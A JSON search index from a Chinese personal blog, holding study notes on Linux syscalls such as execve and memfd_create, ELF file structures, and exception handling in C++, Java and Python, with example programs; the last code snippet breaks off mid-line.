[{"title":"Linux系统中断","path":"/re4mile/2022/06/07/linux/syscall/基础/linux/","content":"参考链接深奥的文章 https://blog.csdn.net/weixin_42915431/article/details/106389272 难以评价的文章 Linux无文件渗透执行ELF https://www.secpulse.com/archives/70269.html ​\thttps://blog.csdn.net/Rong_Toa/article/details/109845832 https://www.cnblogs.com/lsgxeva/p/12956858.html https://cloud.tencent.com/developer/article/1551288 https://blog.csdn.net/Rong_Toa/article/details/109845832 https://blog.csdn.net/Rong_Toa/article/details/109845832 https://cloud.tencent.com/developer/article/1944012 讲kill的文章 https://blog.csdn.net/Scroll_C/article/details/123667340 讲futex的文章 https://blog.csdn.net/www_dong/article/details/119546730 资源中断查询表 64位: 可查询 https://syscalls64.paolostivanin.com/ 32位: 可查询 https://syscalls32.paolostivanin.com/ 中断介绍 https://asm.sourceforge.net/syscall.html https://man7.org/linux/man-pages/man2/ 系统调用号(32&#x2F;64) https://blog.csdn.net/u012763794/article/details/78777938 https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md 基础12345678910111213141516171819202122232425000-015016-031032-047048-063064-079080-095096-111112-127128-143144-159160-175176-191192-207208-223224-239240-255256-271272-287288-303304-319320-335336-351352-367368-383384-399","tags":["elf"],"categories":["Reverse"]},{"title":"ELF文件格式基础篇","path":"/re4mile/2022/06/07/linux/ELF文件格式/基础/linux/","content":"ELF的全称是Executable and Linking Format， 这个名字相当关键，包含了ELF所需要支持的两个功能——执行和链接。 不管是ELF，还是Windows的PE，抑或是MacOS的Mach-O，其根本目的都是为了能让处理器正确执行我们所编写的代码 好文 1http://chuquan.me/2018/05/21/elf-introduce/ 导入ELF文件分类 可执行文件 : 被操作系统中的加载器从硬盘中读取，加载到内存中去执行。 目标文件(.o) ：适合于与其他目标文件链接来创建可执行文件或者共享目标文件的代码和数据。 共享文件(.so) ：在动态链接的时候，由 ld-linux.so 来读取。 分类的宏定义 1234#define ET_REL 1#define ET_EXEC 2#define ET_DYN 3#define ET_CORE 4 ELF文件格式提供了两种不同的视角，(只是用了2个视角看待相同的数据) 链接视图是以节（section）为单位， 执行视图是以段（segment）为单位。 程序头部表（Program Header Table），如果存在的话，告诉系统如何创建进程映像。 节区头部表（Section Header Table）包含了描述文件节区的信息，比如大小、偏移等 注意这里segments与sections是两个不同的概念。之间的关系如下： (1) 每个segments可以包含多个sections (2) 每个sections可以属于多个segments (3) segments之间可以有重合的部分 可以说，一个segment是若干个sections的组合。 目标文件需要链接器做进一步处理，所以一定有Section Header Table； 可执行文件需要加载运行，所以一定有Program Header Table； 而共享库既要加载运行，又要在加载时做动态链接，所以既有Section Header Table又有Program Header Tabl 组成 ELF headerELF头(ELF header)位于文件的开始位置。 它的主要目的是定位文件的其他部分 描述文件的主要特性：类型，CPU架构，入口地址，现有部分的大小和偏移等等 1234567891011121314151617181920212223242526272829303132333435#define EI_NIDENT 16typedef struct&#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125;Elf32_Ehdr;typedef struct&#123; unsigned char e_ident[EI_NIDENT]; //Magic number and other info Elf64_Half e_type; //文件类型 Elf64_Half e_machine; //文件运行的平台 Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; //入口虚拟地址 Elf64_Off e_phoff; //(Program Header)的FA Elf64_Off e_shoff; //(Section Header)的FA Elf64_Word e_flags; //处理器特定的标志，一般为0 Elf64_Half e_ehsize; //Elf_Ehdr的大小,也就是本结构体的大小 Elf64_Half e_phentsize; //每个(Program Header)的大小 Elf64_Half e_phnum; //program header 的个数 Elf64_Half e_shentsize; //每个(Section Header)的大小 Elf64_Half e_shnum; //section header 的个数 Elf64_Half e_shstrndx; //节字符串表的节索引。&#125; Elf64_Ehdr; e_ident(了解) 1234567891011struct MagicNum //16byte&#123;\tBYTE FileName[4];\tBYTE EI_CLASS;//ELFCLASS32代表是32位ELF，ELFCLASS64 代表64位ELF。\tBYTE EI_DATA;//ELFDATA2LSB代表小端，ELFDATA2MSB代表大端。\tBYTE EI_VERSION;//文件版本\tBYTE EI_OS_ABI;//操作系统ABI标识（实际未使用）\tBYTE EI_ABI_VERSION;//：ABI版本（实际 未使用）。\tBYTE EI_Pad[6];//对齐填充，无实际意义。\tBYTE EI_Nident_SIZE;&#125;; e_type(了解) e_entry 表示程序入口地址 Relocatable objects file只是供再链接而已，所以它不存在进入点 这些索引访问包含以下数值的字节 Segment header (执行)系统加载器将文件看作ELF header、Program header table、Segment的集合 其中一个Segment通常由多个Section（节）组成 Program Header Table中包含了运行时加载程序所需要的信息，后面会进行分别介绍 列举了所有有效的段(segments)和他们的属性。 程序头表需要加载器将文件中的节加载到虚拟内存段中 123456789101112struct Elf64_ProgramHeader&#123;\tDWORD p_type; //段类型 DWORD p_flags; //rwx\tQWORD p_offset;//段偏移地址\tQWORD p_vaddr;//VA\tQWORD p_paddr;//FA\tQWORD p_filesz;//本ProgramHeader在文件中的大小\tQWORD p_memsz;//本ProgramHeader在内充中的大小\tQWORD p_align;//对齐方式&#125;; 0 PT_NULL 无意义，可忽略。 1 PT_LOAD 表示一个需要从二进制文件映射到虚拟地址空间的段。其中保存了常量数据（如字符串），程序的目标代码等。 2 PT_DYNAMIC 动态段。包含动态链接所需的信息。 3 PT_INTERP 本段包含一个路径字符串，该路径存放解释器。 4 PT_NOTE 注释段，包含一些辅助信息。 5 PT_SHLIB 保留的段类型，暂不关心。 6 PT_PHDR 程序头段。指明程序头表在文件和内存映像中的位置和大小。 Section header ( 链接 )Section Header Table则包含了链接时所需要用到的信息 .o文件一般只有section,而没有segment部分 1234567891011121314struct Elf64_SectionHeader&#123;\tDWORD sh_name; //节区名，名字是一个 NULL 结尾的字符串。\tDWORD sh_type; //为节区类型\tQWORD sh_flags;\t//节区awx\tQWORD sh_addr; //节区的第一个字节应处的位置。否则，此字段为 0。\tQWORD sh_offset; //此成员的取值给出节区的第一个字节与文件头之间的偏移。\tQWORD sh_size; //此 成 员 给 出 节 区 的 长 度 （ 字 节 数 ）\tDWORD sh_link; //此成员给出节区头部表索引链接。其具体的解释依赖于节区类型。\tDWORD sh_info; //此成员给出附加信息，其解释依赖于节区类型。\tQWORD sh_addralign;//某些节区带有地址对齐约束.\tQWORD sh_entsize; //给出每个表项的长度字节数。&#125;; 图中红色区域的section是没有被映射的内存，当然也在segment中找不到 flag其中已经定义了的各位含义如下: SHF_WRITE: 节区包含进程执行过程中将可写的数据。 SHF_ALLOC: 此节区在进程执行过程中占用内存。某些控制节区- 并不出现于目标文件的内存映像中，对于那些节区，此位应设置为 0。 SHF_EXECINSTR: 节区包含可执行的机器指令。 SHF_MASKPROC: 所有包含于此掩码中的四位都用于处理器专用的语义 .dynsym 符号表,简单的理解就是符号表记录了该文件中的所有符号，所谓的符号就是经过修饰了的函数名或者变量名， 不同的编译器有不同的修饰规则。例如符号_ZL15global_static_a，就是由global_static_a变量名经过修饰而来 123456789struct Elf32_sym &#123; Elf32_Word st_name; //符号表项名称。如果该值非0，则表示符号名的字符串表索引(offset)，否则符号表项没有名称。 Elf32_Addr st_value; //符号的取值。依赖于具体的上下文，可能是一个绝对值、一个地址等等。 Elf32_Word st_size; //符号的尺寸大小。例如一个数据对象的大小是对象中包含的字节数。 unsigned char st_info; //符号的类型和绑定属性。 unsigned char st_other; //该成员当前包含 0，其含义没有定义。 Elf32_Half st_shndx; //每个符号表项都以和其他节区的关系的方式给出定义。此成员给出相关的节区头部表索引。&#125;; .bssSHT_NOBITS\t包含将出现在程序的内存映像中的为初始化数据。 ​ 根据定义，当程序开始执行，系统将把这些数据初始化为 0。此节区不占用文件空间 .shstrtab\t中保存着各Section的名字， .strtab\t中保存着程序中用到的符号的名字 .textSHT_PROGBITS 此节区包含程序的可执行指令。 .data\t保存的是已经初始化了的全局静态变量和局部静态变量 .rodata\t段存放的是只读数据，包括只读变量（const修饰的变量和字符串常量）,如一行C语言代码中的字符串 .symtab\t符号表 .rel.xx\t重定位表也是一个段，用于描述在重定位时链接器如何修改相应段里的内容。对于.text段，对应的重定位表是.rel.text表。 .commentSHT_PROGBITS\t包含版本控制信息。 .debugSHT_PROGBITS\t此节区包含用于符号调试的信息 .dynamicSHT_DYNAMIC\t此节区包含动态链接信息。节区的属性将包含 SHF_ALLOC 位。是否 SHF_WRITE 位被设置取决于处理器 .dynstrSHT_STRTAB\t（动态链接字符串表，此节区包含用于动态链接的字符串，大多数情况下这些字符串代表了与符号表项相关的名称。 .dynsymSHT_DYNSYM\t（动态链接符号表），其保存了从共享库导入的动态符号表 .initSHT_PROGBITS 节区包含了可执行指令，是进程初始化代码的一部分。 ​ 当程序开始执行时，系统要在开始调用主程序入口之前（通常指 C 语言的 main 函数）执行这些代码。 .finiSHT_PROGBITS\t此节区包含了可执行的指令，是进程终止代码的一部分。程序正常退出时，系统将安排执行这里的代码。 .got.plt节SHT_PROGBITS\t此节区包含全局偏移表。（全局偏移表-过程链接表） .hashSHT_HASH\t此节区包含了一个符号哈希表。 .interpSHT_PROGBITS 此节区包含程序解释器的路径名。如果程序包含一个可加载的段， ​ 段中包含此节区，那么节区的属性将包含 SHF_ALLOC 位，否则该位为 0。 .lineSHT_PROGBITS\t此节区包含符号调试的行号信息，其中描述了源程序与机器指令之间的对应关系。其内容是未定义的。 .noteSHT_NOTE\t此节区中包含注释信息，有独立的格式。 .pltSHT_PROGBITS\t此节区包含过程链接表（procedure linkage table）。 .relname和.relanameSHT_REL和SHT_RELA\t（.relname和.relaname）这些节区中包含了重定位信息。 ​ 如果文件中包含可加载的段，段中有重定位内容，节区的属性将包含 ​ SHF_ALLOC 位，否则该位置 0。传统上 name 根据重定位所适用的节区给定。 ​ 例如 .text 节区的重定位节区名字将是：.rel.text 或者 .rela.text。 .rodata和.rodata1SHT_PROGBITS\t这些节区包含只读数据，这些数据通常参与进程映像的不可写段。.shstrtabSHT_STRTAB\t节区包含节区名称。.strtabSHT_STRTAB 节区包含字符串，通常是代表与符号表项相关的名称。 如果文件拥有一个可加载的段，段中包含符号串表， 节区的属性将包含SHF_ALLOC 位，否则该位为 0。.symtabSHT_SYMTAB 节区包含一个符号表。如果文件中包含一个可加载的段， 并且该段中包含符号表，那么节区的属性中包含SHF_ALLOC 位，否则该位置为 0。 字符串表中的第一个字符串（序号为 0）永远是空串，即 null 符号表节的分类中我们介绍了.dynsym节和.symtab节，两者都是符号表。那么它们到底有什么区别呢？存在什么关系呢？ 符号是对某些类型的数据或代码（如全局变量或函数）的符号引用，函数名或变量名就是符号名。 在大多数共享库和动态链接可执行文件中，存在两个符号表。即.dynsym和.symtab。 .dynsym保存了引用来自外部文件符号的全局符号。如printf库函数。 .symtab中还保存了可执行文件的本地符号。如全局变量，代码中定义的本地函数等。 .dynsym保存的符号是.symtab所保存符合的子集， 既然.dynsym是.symtab的子集，那为何要同时存在两个符号表呢？ 通过readelf -S命令可以查看可执行文件的输出， 一部分节标志位（sh_flags）被标记为了A（ALLOC）、WA（WRITE/ALLOC）、AXALLOC/EXEC），. dynsym被标记为ALLOC，而.symtab&#96;则没有标记。 说明dynsym载进入内存,而.symtab不是在运行时必需的，因此不会被装载到内存中。 因此，ELF文件有两个符号表，symtab包含所有内容，但是它不是程序运行必需的，可以剥离，并且没有运行的副作用，dynsym是不可剥离的，包含支持运行时操作所需的符号。 .symtab 符号表 1234567891011121314151617181920struct Elf64_Sym&#123; Elf64_Word\tst_name; /* 符号名。该值为该符号名在字符串表中的偏移地址。 */ unsigned char\tst_info; /* 符号类型及绑定属性*/ unsigned char st_other; /* Symbol visibility */ Elf64_Section\tst_shndx; /* 符号所在的节*/ Elf64_Addr\tst_value; /*\t符号对应的值。存放符号的值（可能是地址或位置偏移量）。 */ Elf64_Xword\tst_size; /*符号的大小*/&#125;;struct Elf32_sym&#123; Elf32_Word st_name; //符号表项名称。如果该值非0，则表示符号名的字 //符串表索引(offset)，否则符号表项没有名称。 Elf32_Addr st_value; //符号的取值。依赖于具体的上下文，可能是一个绝对值、一个地址等等。 Elf32_Word st_size; //符号的尺寸大小。例如一个数据对象的大小是对象中包含的字节数。 unsigned char st_info; //符号的类型和绑定属性。 unsigned char st_other; //未定义。 Elf32_Half st_shndx; //每个符号表项都以和其他节区的关系的方式给出定义。 //此成员给出相关的节区头部表索引。&#125; ; 重定位表 12345678910111213typedef struct&#123; Elf32_Addr\tr_offset; /* Address */ Elf32_Word\tr_info; /* Relocation type and symbol index */ Elf32_Sword\tr_addend; /* Addend */&#125; Elf32_Rela;typedef struct&#123; Elf64_Addr\tr_offset; /* Address */ Elf64_Xword\tr_info; /* Relocation type and symbol index */ Elf64_Sxword\tr_addend; /* Addend */&#125; Elf64_Rela; 其成员含义如下表所示： 成员 含义 r_offset 重定位入口的偏移。 对于可重定位文件来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移 对于可执行文件或共享对象文件来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址 r_info 重定位入口的类型和符号 因为不同处理器的指令系统不一样，所以重定位所要修正的指令地址格式也不一样。每种处理器都有自己的一套重定位入口的类型。 对于可执行文件和共享目标文件来说，它们的重定位入口是动态链接类型的。 重定位是目标文件链接成为可执行文件的关键。我们将在后面的进行介绍。 实践tiny.elfhttps://www.w3cschool.cn/cbook/7to1eozt.html 123457F 45 4C 46 59 59 B2 05 B0 04 CD 80 B0 01 CD 80 02 00 03 00 01 00 00 00 04 80 04 08 2C 00 00 00 84 00 00 00 00 00 00 00 34 00 20 00 01 00 00 00 00 00 00 00 00 80 04 08 00 80 04 08 60 00 00 00 60 00 00 00 05 00 00 00 00 10 00 00","tags":["ELF"],"categories":["Reverse"]},{"title":"C++ Exception","path":"/re4mile/2022/06/07/re/Exception/C++/re/","content":"参考链接https://zhuanlan.zhihu.com/p/103258431 https://zhuanlan.zhihu.com/p/382909501 基础 导入对于: 1234const char * what () const throw ()&#123;\t//函数体&#125; 做几点说明，从左到右看： const char * 表示返回值类型 what 是函数名称 () 是参数列表 const 表示该成员函数不能修改成员变量 throw() 是异常规格说明符。括号内写该函数可抛出的异常类型 上述 5 点均为函数的声明部分。 在 C++11 中，声明一个函数不可以抛出任何异常使用关键字 noexcept。 12void mightThrow(); // could throw any exceptions.void doesNotThrow() noexcept; // does not throw any exceptions. 下面两个函数声明的异常规格在语义上是相同的，都表示函数不抛出任何异常。 12void old_stytle() throw();void new_style() noexcept; //默认 noexcept(true),还可以noexcept(false) try,catch12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;#include &lt;exception&gt; void Just_Runtime_Error()&#123;\tthrow std::runtime_error(&quot;run_error.resmile&quot;);//抛出一个runtime_error&#125;void Just_Test_Char()&#123;\tthrow &quot;I Give A CHar&quot;;//抛出一个 const char* 异常&#125;double MyDivision(int a, int b)&#123;\tif (b == 0)\t&#123; throw &quot;woc, Division by zero !&quot;;//抛出一个 const char* 异常\t&#125;\treturn (a / b);&#125;int main()&#123;\ttry\t&#123; Just_Runtime_Error();\t&#125;\tcatch (std::exception&amp; e)\t&#123; printf(&quot;%s &quot;, e.what());//e.what()返回异常的说明信息? try &#123; Just_Test_Char(); &#125; catch (const char* e)//扔过来的确实是一个const char* ,所以会返回e &#123; printf(&quot;Exception %s &quot;, e); try &#123; MyDivision(2, 0); &#125; catch (const char* e)//扔过来的确实是一个const char* ,所以会返回e &#123; printf(&quot;Exception %s &quot;, e); &#125; &#125;\t&#125;\treturn 0;&#125; 12345678double division(int a, int b)&#123; if( b == 0 ) &#123; throw &quot;Division by zero condition!&quot;; &#125; return (a/b);&#125; 自定义一个异常12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;exception&gt;using namespace std; struct MyException : public exception&#123; const char * what () const throw ()//最后执行了这里 &#123; return &quot;C++ Exception&quot;; &#125;&#125;;//在这里，what() 是异常class类 提供的一个公共方法，//它已被所有子异常类重载。这将返回异常产生的原因。 int main()&#123; try &#123; throw MyException();//先执行这里 &#125; catch(MyException&amp; e)//然后指向了这里 &#123; std::cout &lt;&lt; &quot;MyException caught&quot; &lt;&lt; std::endl; std::cout &lt;&lt; e.what() &lt;&lt; std::endl; &#125; catch(std::exception&amp; e) &#123; //其他的错误 cout&lt;&lt;&quot;//其他的错误&quot;&lt;&lt;endl; &#125;&#125;","tags":["C++","Exception"],"categories":["Language"]},{"title":"Java Exception","path":"/re4mile/2022/06/07/re/Exception/Java/re/","content":"参考链接基础try-catch-final1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner sc = new Scanner(System.in); System.out.println(&quot;请录入第一个数：&quot;); int num1 = sc.nextInt(); System.out.println(&quot;请录入第二个数：&quot;); int num2 = sc.nextInt(); try //try区域存放可能出现的异常的代码 &#123; int result=0; result=num1/num2; //如果出现异常. //1). 异常被捕获.下面2行代码不会被执行 //2). 异常没被捕获,除了finally区域,所有的代码都不会被执行,而直接退出 System.out.println(&quot;商：&quot;+result); System.out.println(&quot;ByeBye&quot;); try &#123; Class.forName(&quot;dqx&quot;).newInstance(); &#125; catch ( InstantiationException | IllegalAccessException ex) &#123; System.out.println(ex.toString()); &#125; &#125; catch(Exception ex) &#123; System.out.println(&quot;对不起，程序出现异常！&quot;); System.out.println(ex);//显示异常的类名 // System.out.println(ex.toString());//打印异常信息： // System.out.println(ex.getMessage());//显示异常的类名,如果没有就显示null // ex.printStackTrace(); //显示异常的堆栈信息 //throw ex;//第四种处理：抛出异常： &#125; finally &#123; System.out.println(&quot;我一定会被执行,我先于try中的return,后于catc语句&quot;); &#125; System.out.println(&quot;谢谢你使用计算器1&quot;); System.out.println(&quot;谢谢你使用计算器2&quot;); System.out.println(&quot;谢谢你使用计算器3&quot;); return; &#125;&#125; 出现异常以后，将异常类型跟catch后面的类型依次比较，按照代码的顺序进行比对 执行第一个与异常类型匹配的catch语句 一旦执行其中一条catch语句之后，后面的catch语句就会被忽略了！ 在安排catch语句的顺序的时候，一般会将特殊异常放在前面（并列），一般化的异常放在后面。 先写子类异常，再写父类异常。 try-catch可以嵌套try-catch throw | throws总结： throw和throws的区别： （1）位置不同： throw：在函数内部去throw throws: 在函数的头部去throws （2）内容不同： throw 一个异常的对象 throws 一个异常的类 （3）作用不同： throw ：异常发生的地方 throws\t: 函数的调用者 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import java.util.Scanner;public class Main&#123; //这是一个main方法，是程序的入口： public static void main(String[] args) //throws Exception,可以继续往上抛出异常 &#123; //实现一个功能：两个数相除，当除数为0的时候，程序出现异常。 try &#123; devide(); &#125; catch (Exception e) &#123; System.out.println(e.toString()+&quot;1&quot;); &#125; &#125; public static void devide() throws Exception &#123; Scanner sc = new Scanner(System.in); System.out.println(&quot;请录入第一个数：&quot;); int num1 = sc.nextInt(); System.out.println(&quot;请录入第二个数：&quot;); int num2 = sc.nextInt(); if(num2 == 0 ) &#123; //除数为0 人为制造异常。 //制造运行时异常： throw new RuntimeException(); //制造检查异常：// try// &#123;// throw new Exception();// &#125;// catch (Exception e)// &#123;// //自己抛出异常,字节catch// System.out.println(e.toString()+&quot;2&quot;);// &#125; // throw new Exception(); &#125; else &#123; System.out.println(&quot;商：&quot;+num1/num2); &#125; &#125;&#125;","tags":["Java","Exception"],"categories":["Language"]},{"title":"Python Exception","path":"/re4mile/2022/06/07/re/Exception/Python/re/","content":"参考链接基础 导入异常类型很多 123456while True: try: x = int(input(&quot;请输入一个数字: &quot;)) break except ValueError: print(&quot;您输入的不是数字，请再次尝试输入！&quot;) try 12345678try: 正常的操作 ......................except(Exception1[, Exception2[,...ExceptionN]]): 发生以上多个异常中的一个，执行这块代码 ......................else: 如果没有异常执行这块代码 except ZeroDivisionError as err: except12345678910111213import systry: f = open(&#x27;myfile.txt&#x27;) s = f.readline() i = int(s.strip())except OSError as err: print(&quot;OS error: &#123;0&#125;&quot;.format(err))except ValueError: print(&quot;Could not convert data to an integer.&quot;)except: print(&quot;Unexpected error:&quot;, sys.exc_info()[0]) raise 123456789def model_exception(x,y): try: b = name a =x/y except(ZeroDivisionError,NameError,TypeError): print(&#x27;one of ZeroDivisionError or NameError or TypeError happend&#x27;)#调用函数结果model_exception(2,0) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364BaseException +-- SystemExit +-- KeyboardInterrupt +-- GeneratorExit +-- Exception +-- StopIteration +-- StopAsyncIteration +-- ArithmeticError | +-- FloatingPointError | +-- OverflowError | +-- ZeroDivisionError +-- AssertionError +-- AttributeError +-- BufferError +-- EOFError +-- ImportError | +-- ModuleNotFoundError +-- LookupError | +-- IndexError | +-- KeyError +-- MemoryError +-- NameError | +-- UnboundLocalError +-- OSError | +-- BlockingIOError | +-- ChildProcessError | +-- ConnectionError | | +-- BrokenPipeError | | +-- ConnectionAbortedError | | +-- ConnectionRefusedError | | +-- ConnectionResetError | +-- FileExistsError | +-- FileNotFoundError | +-- InterruptedError | +-- IsADirectoryError | +-- NotADirectoryError | +-- PermissionError | +-- ProcessLookupError | +-- TimeoutError +-- ReferenceError +-- RuntimeError | +-- NotImplementedError | +-- RecursionError +-- SyntaxError | +-- IndentationError | +-- TabError +-- SystemError +-- TypeError +-- ValueError | +-- UnicodeError | +-- UnicodeDecodeError | +-- UnicodeEncodeError | +-- UnicodeTranslateError +-- Warning +-- DeprecationWarning +-- PendingDeprecationWarning +-- RuntimeWarning +-- SyntaxWarning +-- UserWarning +-- FutureWarning +-- ImportWarning +-- UnicodeWarning +-- BytesWarning +-- ResourceWarning else 123456789import sysfor arg in sys.argv[1:]: try: f = open(arg, &#x27;r&#x27;) except IOError: print(&#x27;cannot open&#x27;, arg) else: print(arg, &#x27;has&#x27;, len(f.readlines()), &#x27;lines&#x27;) f.close() 可以说else执行的代码是衔接try的代码 也就是有异常就执行except 没有异常就执行else finallyfinally 无论是否发生异常都将执行最后的代码 1234finally:&#123;&#125; 123456789try: fh = open(&quot;testfile&quot;, &quot;w&quot;) try: fh.write(&quot;这是一个测试文件，用于测试异常!!&quot;) finally: print &quot;关闭文件&quot; fh.close()except IOError: print &quot;Error: 没有找到文件或读取文件失败&quot; 一个异常可以带上参数，可作为输出的异常信息参数。 raiseraise语句自己触发异常 1raise [Exception [, args [, traceback]]] 语句中 Exception 是异常的类型（例如，NameError）参数标准异常中任一种，args 是自已提供的异常参数。 最后一个参数是可选的（在实践中很少使用），如果存在，是跟踪异常对象 1234def functionName( level ): if level &lt; 1: raise Exception(&quot;Invalid level!&quot;, level) # 触发异常后，后面的代码就不会再执行 123456try: raise NameError(&#x27;HiThere&#x27;)except NameError: print(&#x27;An exception flew by!&#x27;) raiseprint(&quot;dqx&quot;) 发生异常会中断 12345try: raise NameError(&#x27;HiThere&#x27;)except NameError: print(&#x27;An exception flew by!&#x27;)print(&quot;dqx&quot;) 发生异常,但是不处理","tags":["Python","Exception"],"categories":["Language"]},{"title":"Linux syscall 048-063","path":"/re4mile/2022/06/07/linux/syscall/中断详讲/048-063/linux/","content":"参考链接59 sys_execve参考链接 https://man7.org/linux/man-pages/man2/execve.2.html 讲的很详细,可以反复研读: https://www.onitroad.com/jc/linux/man-pages/linux/man2/execve.2.html sys_execve RAX&#x3D; 0x3B RDI&#x3D; const char *pathname RSI&#x3D; char *const argv[] RDX&#x3D; char *const envp[] 12#include &lt;unistd.h&gt;int execve(const char *pathname, char *const argv[],char *const envp[]); 返回值: 成功时，execve()不返回，返回错误-1，并正确设置errno。 关于成功调用函数 如果正在跟踪当前程序，则在成功执行execve()之后会向其发送SIGTRAP信号。 execve()执行路径名引用的程序。 这将导致调用程序当前正在运行的程序被新程序替换， 该程序具有新初始化的堆栈，堆和(初始化和未初始化的)数据段 argv是指向字符串的指针数组，该字符串作为命令行参数传递给新程序。 按照约定，这些字符串中的第一个(即argv [0])应包含与正在执行的文件关联的文件名。 argv数组必须由NULL指针终止。 (因此，在新程序中，argv [argc]将为NULL。) envp是指向字符串的指针数组，通常以key &#x3D; value的形式出现， 这些字符串作为新程序的环境传递。 envp数组必须以NULL指针终止 父文件 1234567891011121314151617181920212223242526/* execve.c */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;intmain(int argc, char *argv[])&#123; char *newargv[] = &#123; &quot;bxb&quot;, &quot;hello&quot;, &quot;world&quot;, NULL &#125;; char *newenviron[] = &#123; NULL &#125;; if (argc != 2) //也就是说,我们必须在运行时加一个参数 &#123; fprintf(stderr, &quot;Usage: %s &lt;file-to-exec&gt; &quot;, argv[0]); exit(EXIT_FAILURE); &#125; newargv[0] = argv[1]; //参数1 文件路径 //参数2 要给那个文件的参数 //参数3 环境? execve(argv[1], newargv, newenviron); perror(&quot;execve&quot;); /*函数本身是不会返回的,如果返回了, 说明execve失败了,也就是如果打印了这句话,说明函数执行失败了*/ printf(&quot;Father Bye &quot;); exit(EXIT_FAILURE);&#125; 子文件 123456789101112131415/* myecho.c */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[])&#123; int j; for (j = 0; j &lt; argc; j++) &#123; printf(&quot;argv[%d]: %s &quot;, j, argv[j]); &#125; //单纯打印传递过来的参数 exit(EXIT_SUCCESS);&#125; 在编译了文件execve.c和myecho.c之后 我们尝试用execve.elf运行myecho.elf 12345┌──(re4mile㉿dqxos-1)-[/mnt/e/Code/normal/elf/C]└─$ ./q wargv[0]: wargv[1]: helloargv[2]: world 可以发现效果就是这样","tags":["elf"],"categories":["Reverse"]},{"title":"Linux syscall 304-319","path":"/re4mile/2022/06/07/linux/syscall/中断详讲/304-319/linux/","content":"参考链接319 memfd_create参考链接 https://cloud.tencent.com/developer/article/1551288 https://syscalls64.paolostivanin.com/ https://man7.org/linux/man-pages/man2/memfd_create.2.html 1234#define _GNU_SOURCE /* See feature_test_macros(7) */#include &lt;sys/mman.h&gt;int memfd_create(const char *name, unsigned int flags);","tags":["elf"],"categories":["Reverse"]},{"title":"Linux syscall 320-355","path":"/re4mile/2022/06/07/linux/syscall/中断详讲/320-335/linux/","content":"参考链接322参考链接 https://www.onitroad.com/jc/linux/man-pages/linux/man2/execveat.2.html https://man7.org/linux/man-pages/man2/execveat.2.html 1234#include &lt;linux/fcntl.h&gt; /* Definition of AT_* constants */#include &lt;unistd.h&gt;int execveat(int dirfd, const char *pathname,const char *const argv[], const char *const envp[],int flags); execveat()系统调用执行由dirfd和pathname组合引用的程序。 它的运行方式与execve()类似","tags":["elf"],"categories":["Reverse"]},{"title":"LinuxC语言","path":"/re4mile/2021/06/07/linux/编程/linux/","content":"文件系统ext文件描述符对应的file结构体 123456789101112131415161718192021222324565 struct file &#123;566 struct list_head f_list;//打开的文件形成的链表,链表作用不多说567 struct dentry *f_dentry;568 struct vfsmount *f_vfsmnt;569 struct file_operations *f_op;570 atomic_t f_count;//引用计数571 unsigned int f_flags;//打开文件时候指定的标识572 mode_t f_mode;//文件的访问模式573 loff_t f_pos;//目前文件的相对开头的偏移574 unsigned long f_reada, f_ramax, f_raend, f_ralen, f_rawin;575 struct fown_struct f_owner;//：记录一个进程ID576 unsigned int f_uid, f_gid;//：记录用户ID,组ID577 int f_error;578 579 size_t f_maxcount;580 unsigned long f_version;581 582 /* needed for tty driver, and maybe others */583 void *private_data;584 585 /* preallocated helper kiobuf to speedup O_DIRECT */586 struct kiobuf *f_iobuf;587 long f_iobuf_lock;588 &#125;; 在file结构体中维护文件状态 Flag（file结构体的成员f_flags） 当前读写位置（file结构体的成员f_pos) 比较重要的成员还有f_count，表示引用计数（Reference Count） 后面我们会讲到，dup、fork等系统调用会导致多个文件描述符指向同一个file结构体 例如有fd1和fd2都引用同一个file结构体，那么它的引用计数就是2， 当close(fd1)时并不会释放file结构体，而只是把引用计数减到1 如果再close(fd2)，引用计数就会减到0同时释放file结构体， 这才真的关闭了文件 每个file结构体都指向一个file_operations结构体 这个结构体的成员都是函数指针，指向实现各种文件操作的内核函数 比如在用户程序中read一个文件描述符，read通过系统调用进入内核， 然后找到这个文件描述符所指向的file结构体，找到file结构体所指向的file_operations结构体， 调用它的read成员所指向的内核函数以完成用户请求。 在用户程序中调用lseek、read、write、ioctl、open等函数，最终都由内核调用file_operations的 各成员所指向的内核函数完成用户请求。 file_operations结构体中的release成员用于完成用户程序的close请求，之所以叫release而不叫close 是因为它不一定真的关闭文件，而是减少引用计数，只有引用计数减到0才关闭文件 每个file结构体都有一个指向dentry结构体的指针dentry是directory entry（目录项）的缩写 我们传给open、stat等函数的参数的是一个路径，例如&#x2F;home&#x2F;akaedu&#x2F;a，需要根据路径找到文件的inode 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAX_PATH 1024/* dirwalk: apply fcn to all files in dir */void dirwalk(char *dir, void (*fcn)(char *))&#123;\tchar name[MAX_PATH];\tstruct dirent *dp;\tDIR *dfd;\tif ((dfd = opendir(dir)) == NULL)\t&#123; fprintf(stderr, &quot;dirwalk: can&#x27;t open%s &quot;, dir); return;\t&#125;\twhile ((dp = readdir(dfd)) != NULL) &#123; if (strcmp(dp-&gt;d_name, &quot;.&quot;) == 0|| strcmp(dp-&gt;d_name, &quot;..&quot;) == 0) continue; /* skip self and parent */ if (strlen(dir)+strlen(dp-&gt;d_name)+2 &gt;sizeof(name)) 